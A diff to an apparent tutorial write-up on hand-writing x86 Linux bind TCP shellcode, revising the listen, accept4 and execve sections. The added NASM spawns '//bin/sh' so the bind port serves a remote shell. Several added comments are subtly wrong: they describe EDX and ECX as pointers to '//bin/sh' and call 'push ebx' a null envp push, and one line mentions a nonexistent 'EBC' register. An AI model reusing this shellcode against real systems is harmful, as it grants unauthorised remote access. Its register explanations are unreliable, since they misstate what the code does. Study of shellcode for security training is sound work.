@@ -333,7 +333,7 @@ Followed by an instruction to call the interrupt to execute the bind syscall:
     	int 0x80	; call the interrupt to execute the bind syscall
 ```
 
-#### 3rd Syscall (Listen for Incoming Connections)
+#### 3rd Syscall (Listen for incoming connections)
 ----
 
 The listen syscall works by preparing the bind socket to listen for incoming connections. 
@@ -408,7 +408,7 @@ The ECX memory register is then cleared, the  program interrupt is called and th
     	int 0x80	; call the interrupt to execute the listen syscall
 ```
 
-#### 4th Syscall (Accept Incoming Connections)
+#### 4th Syscall (Accept incoming connections)
 ----
 
 The accept4 syscall begins with its code value of 364, converting from decimal to hex equals 0x16c:
@@ -576,7 +576,7 @@ This objective is achieved when a connection is made to the newly created bind p
 
 This instuction set will load the string '/bin/sh' onto the stack in reverse order since the stack grows from high to low memory.
 
-The execve syscall works with null pointers and terminators, which requires a terminator to be placed onto the stack after clearing the EAX register and setting to '0':
+The execve syscall works with null pointers and terminators, which requires a terminator to be placed onto the stack after clearing the EAX register and setting the value to '0':
 
 ```nasm
 	xor eax, eax	; clear register, place execve
@@ -602,33 +602,52 @@ Type "help", "copyright", "credits" or "license" for more information.
 '68732f6e'
 >>> binascii.hexlify(b'ib//')
 '69622f2f'
->>> 
 ```
 
-After the null has been pushed to the stack to null terminate the '//bin/sh argument', the hex values for '//bin/sh' can then be pushed onto the stack (reverse order):
+After the null terminator has been pushed onto the stack to null terminate the '//bin/sh argument', the hex values for '//bin/sh' can then be pushed onto the stack (reverse order):
 
 ```nasm
 	push  0x68732f2f ; push the end of "//bin/sh", 'hs/n'
 	push  0x6e69622f ; push the beginning of "//bin/sh", 'ib//'
 ```
 
-The execve syscall and the the exit syscall are executed to initiate the program and finally create the full bind TCP shell on the target machine.
-
-Final section 6 code ...
+The EBX register will be used to carry the pointer location of the '//bin/sh' entity, which points EBC to the stack:
 
 ```nasm
-	xor eax, eax
-	push eax
-	push 0x68732f6e
-	push 0x69622f2f
-	mov ebx, esp	; '//bin/sh', null terminated
-	push eax
-	mov edx, esp
-	push ebx
-	mov ecx, esp
-	mov al, 0x0b
+	mov ebx, esp	; move pointer to '//bin/sh' into ebx, null terminated
+```
+Null out the EAX register by pushing the value of '0' onto the stack, then move the pointer to '//bin/sh' from ESP into EDX (null terminated):
 
-  	int 0x80
+```nasm
+	push eax	; push 0 onto the stack, sys argv
+	mov edx, esp	; move pointer to '//bin/sh' into edx, null terminated
+```
+
+ECX should point to the location of EBX, push EBX onto the stack and then move ESP into ECX:
+
+```nasm
+	push ebx	; push 0 onto the stack, sys envp
+	mov ecx, esp	; move pointer to '//bin/sh' into ecx, null terminated
+```
+
+Finally the value of 0x0b is placed into the lower memory region of EAX.
+
+The execve syscall and the the exit syscall are executed to initiate the program and finally create the full bind TCP shell on the target machine.
+
+6th syscall (Assembly code section):
+
+```nasm
+	xor eax, eax	; clear register, place execve
+	push eax	; terminator placed onto the stack with value of 0
+	push 0x68732f6e	; push the end of "//bin/sh", 'hs/n'
+	push 0x69622f2f	; push the beginning of "//bin/sh", 'ib//'
+	mov ebx, esp	; move pointer to '//bin/sh' into ebx, null terminated
+	push eax	; push 0 onto the stack
+	mov edx, esp	; move pointer to '//bin/sh' into edx, null terminated
+	push ebx	; push 0 onto the stack
+	mov ecx, esp	; move pointer to '//bin/sh' into ecx, null terminated
+	mov al, 0x0b	; execve syscall
+  	int 0x80	; execute '//bin/sh' shell
 ```
 
 #### Assembly Code
